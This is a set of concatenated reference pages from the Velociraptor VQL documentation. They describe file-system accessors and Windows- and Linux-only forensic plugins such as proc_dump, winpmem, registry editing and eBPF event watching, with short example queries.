no_edit: true
---



<div class="vql_item"></div>


## vfs
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access client's VFS filesystem on the server.

On the Velociraptor server, the Virtual File System (VFS)
represents a cached copy of the files and directories we have
collected from the client using the `VFS` GUI.

Since it is a snapshot formed over multiple collections from the
GUI it may change in future (for example if a file is added or
removed, the next time the directory is refreshed the VFS view
will change).

Due to the interactive nature of the VFS collections, the VFS is
constructed over many collections in different times.

Sometimes we want to directly read those cached files and
directories and this is where the `vfs` accessor comes in.

The accessor gets the client's ID from the `ClientId` scope
variable. The first component of the path is taken to be the
accessor (top level of the VFS GUI).

This accessor is mostly used in the `System.VFS.Export` artifact
to facilitate snapshotting of the VFS view in the GUI.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/fs/_index.md
======
---
title: fs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## fs
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Provide access to the server's filestore and datastore.

Many VQL plugins produce references to files stored on the
server. This accessor can be used to open those files and read
them. Typically references to filestore or datastore files have
the "fs:" or "ds:" prefix.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/smb/_index.md
======
---
title: smb
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## smb
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access smb shares (e.g. Windows shares).

This accessor is similar to the `s3` accessor in allowing access
to remote network shares. The credentials are passed in a scope
variable called `SMB_CREDENTIALS`. The credentials are a dict with
the server name being the key and the username and password joined
with ":".

The first element in the path is treated as the server name (top
level directory). The accessor then looks up the relevant
credentials from the `SMB_CREDENTIALS` dict. This allows multiple
servers and multiple credentials to be defined at the same time.

### Example

```
LET SMB_CREDENTIALS <= dict(ServerName="Username:Password")

SELECT OSPath,
FROM glob(globs='*',
  root="/ServerName/Windows/System32",
  accessor="smb")
```

### Notes

It is more convenient to use the [secrets support]({{< ref
"/blog/2024/2024-03-10-release-notes-0.72/#secret-management" >}})
in 0.72 to manage these credentials.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/ewf/_index.md
======
---
title: ewf
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ewf
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allow reading an EWF file.

Note that usually EWF files form a set of files with extensions
like .E01, .E02 etc. This accessor will automatically try to find
all parts of the same volume set if the file name ends with a '.E01'.

### Example

```vql
SELECT * FROM glob(
  globs="*", accessor="raw_ntfs", root=pathspec(
    Path="/",
    DelegateAccessor="ewf",
    DelegatePath="C:/test.ntfs.dd.E01"))
```

The next example reads a FAT partition through the offset
accessor (32256 is the byte offset of the first FAT partition).

```vql
SELECT OSPath.Path AS OSPath, Size, Mode.String
FROM glob(
       globs="*", accessor="fat", root=pathspec(
          Path="/",
          DelegateAccessor="offset",
          DelegatePath=pathspec(
            Path="/32256",
            DelegateAccessor="ewf",
            DelegatePath="/tmp/ubnist1.gen3.E01")))
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/ranged/_index.md
======
---
title: ranged
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ranged
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Reconstruct sparse files from idx and base


---END OF FILE---

======
FILE: /content/vql_reference/accessors/data/_index.md
======
---
title: data
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## data
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Makes a string appears as an in memory file.

Path is taken as a literal string to use as the file's data

This accessor is useful to allow plugins that normally accept files to
also accept a plain string (for example `parse_binary()`).



---END OF FILE---

======
FILE: /content/vql_reference/accessors/registry/_index.md
======
---
title: registry
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## registry
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the registry like a filesystem using the OS APIs.


---END OF FILE---

======
FILE: /content/vql_reference/accessors/zip/_index.md
======
---
title: zip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## zip
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Open a zip file as if it was a directory.

Filename is a pathspec with a delegate accessor opening the Zip file,
and the Path representing the file within the zip file.

### Example

```vql
SELECT OSPath, Mtime, Size from glob(
   globs='/**/*.txt',
   root=pathspec(DelegateAccessor='file',
     DelegatePath="File.zip",
     Path='/'),
   accessor='zip')
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/reg/_index.md
======
---
title: reg
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## reg
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the registry like a filesystem using the OS APIs.


---END OF FILE---

======
FILE: /content/vql_reference/accessors/s3/_index.md
======
---
title: s3
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## s3
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allows access to S3 buckets.

1. The first component is interpreted as the bucket name.

2. Provide credentials through the VQL environment
   variable `S3_CREDENTIALS`. This should be a dict with
   a key of the bucket name and the value being the credentials.

### Example

```vql
LET S3_CREDENTIALS<=dict(endpoint='http://127.0.0.1:4566/',
  credentials_key='admin',
  credentials_secret='password',
  no_verify_cert=1)

SELECT *, read_file(filename=OSPath,
   length=10, accessor='s3') AS Data
FROM glob(
   globs='/velociraptor/orgs/root/clients/C.39a107c4c58c5efa/collections/*/uploads/auto/*',
   accessor='s3')
```

### Notes

It is more convenient to use the [secrets support]({{< ref
"/blog/2024/2024-03-10-release-notes-0.72/#secret-management" >}})
introduced in version 0.72 to manage these credentials.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/pipe/_index.md
======
---
title: pipe
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pipe
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Read from a VQL pipe.

**NOTE: this is not the same as a windows named pipe**.

A VQL pipe allows data to be generated from a VQL query, as the
pipe is read, the query proceeds to feed more data to it.

### Example

```vql
LET MyPipe = pipe(query={
        SELECT _value FROM range(start=0, end=10, step=1)
}, sep="\n")

SELECT read_file(filename="MyPipe", accessor="pipe")
FROM scope()
```

It is mostly useful for redirecting the output of one query to
another without using temp files. You probably do not want to use
it!



---END OF FILE---

======
FILE: /content/vql_reference/accessors/ntfs_vss/_index.md
======
---
title: ntfs_vss
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ntfs_vss
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the NTFS filesystem by considering all VSS.

This accessor considers all Volume Shadow Copies available on the
system to deduplicate all files which are identical across all
VSS. Only files that have been modified are shown.

This makes it easier to compare files across VSS copies. If the
file is the same across all VSS then the accessor prefers to show
the one of the main device (i.e. `\\.\C:`)



---END OF FILE---

======
FILE: /content/vql_reference/accessors/process/_index.md
======
---
title: process
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access process memory like a file.

The Path is taken in the form `/<pid>`, i.e. the pid appears as
the top level path component.

The accessor does not support directories so it can not be used
with the `glob()` plugin. It is useful for any functions or
plugins that need to read from process memory.

Note that process memory is typically very sparse (on 64 bit
systems it covers the entire address space). Therefore,
Velociraptor will treat it as sparse - various plugins that
support sparse files (such as the `upload()` plugin or `yara()`
plugin) will automatically handle the unmapped regions.

You will therefore need other plugins like `vad()` to figure out
the exact process memory layout where there is data to read. It is
not an error to read from unmapped regions, but it will just
return nulls.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/mft/_index.md
======
---
title: mft
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mft
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

The `mft` accessor is used to access arbitrary MFT streams as
files.

The filename is taken as an MFT inode number in the form
`<entry_id>-<stream_type>-<id>`, e.g. `203-128-0`. The first
component of the file is the device number to open (e.g. `C:`)

This accessor does not support directories and so can not be used
in `glob()`

### Example

```vql
SELECT upload(accessor="mft", filename="C:/203-128-0")
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/file_nocase/_index.md
======
---
title: file_nocase
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## file_nocase
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access files using the operating system's API.

On Linux this accessor implements case insensitive comparisons
over the usual case sensitive filesystem. This is important for
cases where Windows files are unpacked on a Linux system and you
are trying to use artifacts written for Windows - they may fail
due to incorrect casing making it impossible to find the right
files.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/offset/_index.md
======
---
title: offset
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## offset
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allow reading another file from a specific offset.

The filename is taken as an offset into the delegate.

### Example

```vql
SELECT read_file(accessor="offset", filename=pathspec(
DelegateAccessor="data",
DelegatePath="Hello world",
Path="/6"))
FROM scope()

-> "world"
```

This accessor is useful in cases where we need to rebase the zero
offset into the file. For example when reading a filesystem
partition from an image.



---END OF FILE---

======
FILE: /content/vql_reference/windows/_index.md
======
---
title: Windows-only
weight: 20
linktitle: Windows
index: true
no_edit: true
no_children: true
---

Many VQL plugins and functions provide access to the Windows APIs. The
following are only available when running Velociraptor on Windows.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[amsi](amsi)|<span class='vql_type'>Function</span>|AMSI is an interface on windows to scan a string for malware|
|[appcompatcache](appcompatcache)|<span class='vql_type'>Plugin</span>|Parses the appcompatcache|
|[authenticode](authenticode)|<span class='vql_type'>Function</span>|Parses authenticode information from PE files|
|[certificates](certificates)|<span class='vql_type'>Plugin</span>|Collect certificate from the system trust store|
|[etw_sessions](etw_sessions)|<span class='vql_type'>Plugin</span>|Enumerates all active ETW sessions|
|[handles](handles)|<span class='vql_type'>Plugin</span>|Enumerate process handles|
|[interfaces](interfaces)|<span class='vql_type'>Plugin</span>|List all active network interfaces using the API|
|[lookupSID](lookupSID)|<span class='vql_type'>Function</span>|Get information about the SID|
|[modules](modules)|<span class='vql_type'>Plugin</span>|Enumerate Loaded DLLs|
|[partitions](partitions)|<span class='vql_type'>Plugin</span>|List all partitions|
|[proc_dump](proc_dump)|<span class='vql_type'>Plugin</span>|Dumps process memory|
|[proc_yara](proc_yara)|<span class='vql_type'>Plugin</span>|Scan processes using yara rules|
|[read_reg_key](read_reg_key)|<span class='vql_type'>Plugin</span>|This is a convenience plugin which applies the globs to the registry|
|[reg_rm_key](reg_rm_key)|<span class='vql_type'>Function</span>|Removes a key and all its values from the registry|
|[reg_rm_value](reg_rm_value)|<span class='vql_type'>Function</span>|Removes a value in the registry|
|[reg_set_value](reg_set_value)|<span class='vql_type'>Function</span>|Set a value in the registry|
|[srum_lookup_id](srum_lookup_id)|<span class='vql_type'>Function</span>|Lookup a SRUM id|
|[threads](threads)|<span class='vql_type'>Plugin</span>|Enumerate threads in a process|
|[token](token)|<span class='vql_type'>Function</span>|Extract process token|
|[users](users)|<span class='vql_type'>Plugin</span>|Display information about workstation local users|
|[vad](vad)|<span class='vql_type'>Plugin</span>|Enumerate process memory regions|
|[winobj](winobj)|<span class='vql_type'>Plugin</span>|Enumerate The Windows Object Manager namespace|
|[winpmem](winpmem)|<span class='vql_type'>Function</span>|Uses the `winpmem` driver to take a memory image|
|[wmi](wmi)|<span class='vql_type'>Plugin</span>|Execute simple WMI queries synchronously|

---END OF FILE---

======
FILE: /content/vql_reference/windows/proc_dump/_index.md
======
---
title: proc_dump
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## proc_dump
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The PID to dump out.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Dumps process memory.

Dumps a process into a crashdump. The crashdump file can be opened
with the windows debugger as normal. The plugin returns the filename
of the crash dump which is a temporary file - the file will be removed
when the query completes, so if you want to hold on to it, you should
use the upload() plugin to upload it to the server or otherwise copy
it.



---END OF FILE---

======
FILE: /content/vql_reference/windows/reg_rm_value/_index.md
======
---
title: reg_rm_value
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## reg_rm_value
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Registry value path.|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Removes a value in the registry.


---END OF FILE---

======
FILE: /content/vql_reference/windows/etw_sessions/_index.md
======
---
title: etw_sessions
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## etw_sessions
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
count|The count of sessions to retrieve (default 64) |uint64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerates all active ETW sessions


---END OF FILE---

======
FILE: /content/vql_reference/windows/winpmem/_index.md
======
---
title: winpmem
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## winpmem
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
service|The name of the driver service to install.|string
image_path|If specified we write a physical memory image on this path.|string
compression|When writing a memory image use this compression (default none) can be none, s2, snappy, gzip.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Uses the `winpmem` driver to take a memory image.

This plugin is also needed to facilitate the winpmem accessor.

When the `image_path` parameter is not set this function will load
the `winpmem` driver until the scope is destroyed at the end of
the query (where the driver will be unloaded).

If the `image_path` parameter is give, the path will be used to
create a raw memory image. The image can be compressed using a
number of algorithms such as:

1. None - no compression (default)

2. S2 or snappy - these are fast algorithms with poor compression
   ratio but should result in some speed up over no compression.

3. The Gzip method is used to produce a compatible gzip file. This
   is very slow and so it is not suitable for large memory systems
   as there will be too much smear.


### Example

```vql
SELECT winpmem(image_path='c:/test.dd', compression='s2') FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/windows/certificates/_index.md
======
---
title: certificates
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## certificates
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Collect certificate from the system trust store.

This plugin uses the Windows APIs to fetch the certificates. You
might also want to look at the `Windows.System.RootCAStore`
artifact.



---END OF FILE---

======
FILE: /content/vql_reference/windows/appcompatcache/_index.md
======
---
title: appcompatcache
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## appcompatcache
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Parses the appcompatcache.


---END OF FILE---

======
FILE: /content/vql_reference/windows/users/_index.md
======
---
title: users
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## users
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Display information about workstation local users. This is obtained through the NetUserEnum() API.


---END OF FILE---

======
FILE: /content/vql_reference/windows/handles/_index.md
======
---
title: handles
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## handles
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|If specified only get handles from these PIDs.|uint64
types|If specified only get handles of this type.|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate process handles.



---END OF FILE---

======
FILE: /content/vql_reference/windows/wmi/_index.md
======
---
title: wmi
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## wmi
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|The WMI query to issue.|string (required)
namespace|The WMI namespace to use (ROOT/CIMV2)|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Execute simple WMI queries synchronously.

This plugin issues a WMI query and returns its rows directly. The
exact format of the returned row depends on the WMI query issued.

This plugin creates a bridge between WMI and VQL and it is a very
commonly used plugin for inspecting the state of windows systems.



---END OF FILE---

======
FILE: /content/vql_reference/windows/reg_set_value/_index.md
======
---
title: reg_set_value
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## reg_set_value
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Registry value path.|string (required)
value|Value to set|LazyExpr (required)
type|Type to set (SZ, DWORD, QWORD)|string (required)
create|Set to create missing intermediate keys|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Set a value in the registry.


---END OF FILE---

======
FILE: /content/vql_reference/windows/threads/_index.md
======
---
title: threads
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## threads
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The PID to get the thread for.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate threads in a process.


---END OF FILE---

======
FILE: /content/vql_reference/windows/lookupSID/_index.md
======
---
title: lookupSID
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lookupSID
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
sid|A SID to lookup using LookupAccountSid |string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Get information about the SID.


---END OF FILE---

======
FILE: /content/vql_reference/windows/proc_yara/_index.md
======
---
title: proc_yara
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## proc_yara
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
rules|Yara rules|string (required)
pid|The pid to scan|int (required)
context|Return this many bytes either side of a hit|int
key|If set use this key to cache the  yara rules.|string
namespace|The Yara namespece to use.|string
vars|The Yara variables to use.|ordereddict.Dict
number|Stop after this many hits (1).|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Scan processes using yara rules.

This plugin uses yara's own engine to scan process memory for the signatures.

{{% notice note %}}

Process memory access depends on having the [SeDebugPrivilege](https://support.microsoft.com/en-au/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege) which depends on how Velociraptor was started. Even when running as System, some processes are not accessible.

{{% /notice %}}



---END OF FILE---

======
FILE: /content/vql_reference/windows/interfaces/_index.md
======
---
title: interfaces
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## interfaces
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

List all active network interfaces using the API.



---END OF FILE---

======
FILE: /content/vql_reference/windows/winobj/_index.md
======
---
title: winobj
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## winobj
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Object namespace path.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate The Windows Object Manager namespace.


---END OF FILE---

======
FILE: /content/vql_reference/windows/partitions/_index.md
======
---
title: partitions
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## partitions
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

List all partitions


---END OF FILE---

======
FILE: /content/vql_reference/windows/reg_rm_key/_index.md
======
---
title: reg_rm_key
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## reg_rm_key
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Registry key path.|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Removes a key and all its values from the registry.


---END OF FILE---

======
FILE: /content/vql_reference/windows/srum_lookup_id/_index.md
======
---
title: srum_lookup_id
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## srum_lookup_id
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file||OSPath (required)
accessor|The accessor to use.|string
id||int64 (required)

### Description

Lookup a SRUM id.


---END OF FILE---

======
FILE: /content/vql_reference/windows/read_reg_key/_index.md
======
---
title: read_reg_key
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## read_reg_key
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
globs|Glob expressions to apply.|list of string
accessor|The accessor to use.|string
root|The root directory to glob from (default '/').|OSPath

### Description

This is a convenience plugin which applies the globs to the registry
accessor to find keys. For each key the plugin then lists all the
values within it, and returns a row which has the value names as
columns, while the cells contain the value's stat info (and data
content available in the `Data` field).

This makes it easier to access a bunch of related values at once.



---END OF FILE---

======
FILE: /content/vql_reference/windows/amsi/_index.md
======
---
title: amsi
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## amsi
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to scan|string (required)

### Description

AMSI is an interface on windows to scan a string for malware. This
function submits the string to the AMSI system and receives a
determination if it is malware.



---END OF FILE---

======
FILE: /content/vql_reference/windows/vad/_index.md
======
---
title: vad
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## vad
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The PID to dump out.|int64 (required)

### Description

Enumerate process memory regions.


---END OF FILE---

======
FILE: /content/vql_reference/windows/modules/_index.md
======
---
title: modules
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## modules
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The PID to dump out.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate Loaded DLLs.


---END OF FILE---

======
FILE: /content/vql_reference/windows/token/_index.md
======
---
title: token
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## token
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The PID to get the token for.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Extract process token.


---END OF FILE---

======
FILE: /content/vql_reference/windows/authenticode/_index.md
======
---
title: authenticode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## authenticode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
accessor|The accessor to use.|string
filename|The filename to parse.|OSPath (required)
verbose|Set to receive verbose information about all the certs.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Parses authenticode information from PE files.

On windows, the function will also use the windows API to determine
if the binary is trusted by the system.



---END OF FILE---

======
FILE: /content/vql_reference/linux/_index.md
======
---
title: Linux-only
weight: 30
linktitle: Linux
index: true
no_edit: true
no_children: true
---

The following are only available when running Velociraptor on Linux.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[audit](audit)|<span class='vql_type'>Plugin</span>|Register as an audit daemon in the kernel|
|[connections](connections)|<span class='vql_type'>Plugin</span>|List all active connections|
|[ebpf_events](ebpf_events)|<span class='vql_type'>Plugin</span>|Dumps information about potential ebpf_events that can be used by the|
|[sysinfo](sysinfo)|<span class='vql_type'>Function</span>|Collect system information on Linux clients|
|[watch_ebpf](watch_ebpf)|<span class='vql_type'>Plugin</span>|Watch for events from eBPF|

---END OF FILE---

======
FILE: /content/vql_reference/linux/audit/_index.md
======
---
title: audit
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## audit
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Register as an audit daemon in the kernel.

On Linux the audit subsystem provides real time information about
kernel auditable events. This plugin registers as a consumer and
returns parsed events as rows.

You should configure the audit subsystem using the `auditctl`
binary before using this plugin.



---END OF FILE---

======
FILE: /content/vql_reference/linux/sysinfo/_index.md
======
---
title: sysinfo
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sysinfo
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Collect system information on Linux clients


---END OF FILE---

======
FILE: /content/vql_reference/linux/watch_ebpf/_index.md
======
---
title: watch_ebpf
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## watch_ebpf
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
events|A list of event names to acquire.|list of string (required)
include_env|Include process environment variables.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Watch for events from eBPF.

This plugin uses the integrated tracee eBPF engine to stream events.

See https://github.com/Velocidex/tracee_velociraptor for more details.

### See also

- [ebpf_events]({{< ref "/vql_reference/linux/ebpf_events/" >}}): Dumps information about
  potential ebpf_events.



---END OF FILE---

======
FILE: /content/vql_reference/linux/ebpf_events/_index.md
======
---
title: ebpf_events
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ebpf_events
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Dumps information about potential ebpf_events that can be used by the
`watch_ebpf` plugin.

### See also

- [watch_ebpf]({{< ref "/vql_reference/linux/watch_ebpf/" >}})



---END OF FILE---

======
FILE: /content/vql_reference/linux/connections/_index.md
======
---
title: connections
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## connections
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

List all active connections



---END OF FILE---

======
FILE: /content/vql_reference/popular/_index.md
======
---
title: Frequently Used ✨
weight: 10
linktitle: Frequently Used
index: true
no_edit: true
no_children: true
---

These are the functions and plugins that are the most frequently used in
[Velociraptor's built-in artifacts](/artifact_references/) and the
[Community Exchange artifacts](/exchange/). So we can infer that these are
the most "popular" and therefore probably the most useful ones for everyday
artifact writing.

VQL provides a vast array of functions and plugins allowing queries to
manipulate data and implement logic. Many are suitable for specific use
cases, however most on this page are considered foundational to the VQL
language. They are the general purpose VQL "workhorses", which is why they
are frequently used in the existing artifacts.

If you are new to VQL then this is a good place to start and become
acquainted with the commonly used functions and plugins.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[atoi](atoi)|<span class='vql_type'>Function</span>|Convert a string to an integer|
|[basename](basename)|<span class='vql_type'>Function</span>|Return the basename of the path|
|[chain](chain)|<span class='vql_type'>Plugin</span>|Chain the output of several queries into the same table|
|[column_filter](column_filter)|<span class='vql_type'>Plugin</span>|Select columns from another query using regex|
|[count](count)|<span class='vql_type'>Function</span>|Counts the items|
|[dict](dict)|<span class='vql_type'>Function</span>|Construct a dict from arbitrary keyword args|
|[execve](execve)|<span class='vql_type'>Plugin</span>|This plugin launches an external command and captures its STDERR,|
|[expand](expand)|<span class='vql_type'>Function</span>|Expand the path using the environment|
|[filter](filter)|<span class='vql_type'>Function</span>|Filters an array by regex or condition|
|[flatten](flatten)|<span class='vql_type'>Plugin</span>|Flatten the columns in query|
|[foreach](foreach)|<span class='vql_type'>Plugin</span>|Executes 'query' once for each row in the 'row' query|
|[format](format)|<span class='vql_type'>Function</span>|Format one or more items according to a format string|
|[get](get)|<span class='vql_type'>Function</span>|Gets the member field from the item|
|[glob](glob)|<span class='vql_type'>Plugin</span>|Retrieve files based on a list of glob expressions|
|[http_client](http_client)|<span class='vql_type'>Plugin</span>|Make a http request|
|[humanize](humanize)|<span class='vql_type'>Function</span>|Format items in human readable way|
|[if](if)|<span class='vql_type'>Function</span>|Conditional execution of query|
|[if](if)|<span class='vql_type'>Plugin</span>|Conditional execution of query|
|[info](info)|<span class='vql_type'>Plugin</span>|Get information about the running host|
|[int](int)|<span class='vql_type'>Function</span>|Truncate to an integer|
|[items](items)|<span class='vql_type'>Function</span>|Iterate over dict members producing _key and _value columns|
|[items](items)|<span class='vql_type'>Plugin</span>|Enumerate all members of the item (similar to Python's items() method)|
|[join](join)|<span class='vql_type'>Function</span>|Join all the args on a separator|
|[len](len)|<span class='vql_type'>Function</span>|Returns the length of an object|
|[log](log)|<span class='vql_type'>Function</span>|Log a message to the query log stream|
